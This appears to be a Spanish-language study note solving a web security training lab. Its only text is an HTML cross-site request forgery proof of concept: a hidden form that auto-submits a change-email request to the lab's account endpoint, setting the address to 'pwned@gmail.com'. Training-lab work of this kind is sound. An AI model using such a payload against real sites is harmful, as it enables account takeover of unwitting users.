
## Objetivo:

![[Pasted image 20240515230656.png]]

## Solucion:

![[Pasted image 20240515231526.png]]


```
<body>

<form action="https://0a1e00a8031a8cad802785a900c50061.web-security-academy.net/my-account/change-email" method="post">

<input type="hidden" name="email" value="pwned@gmail.com" />

</form>

<script>

document.forms[0].submit()

</script>

</body>
```
